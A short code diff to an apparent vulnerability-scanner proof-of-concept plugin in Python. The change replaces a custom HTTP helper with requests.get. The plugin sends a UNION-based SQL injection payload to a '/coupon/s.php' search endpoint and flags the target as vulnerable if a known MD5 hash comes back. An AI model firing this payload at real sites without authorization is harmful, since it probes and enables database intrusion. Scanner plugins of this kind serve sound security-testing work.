@@ -35,8 +35,8 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             payload = "/coupon/s.php??action=search&keyword=11&fid=1&fids[]=0) union select md5(3.1415),2,3,4,5,6,7,8,9%23"
             url = arg + payload
-            code, head, res, errcode, _ = hh.http('"%s"' % url)
-            if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
+            res = requests.get(url)
+            if res.status_code == 200 and "63e1f04640e83605c1d177544a5a0488" in res.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
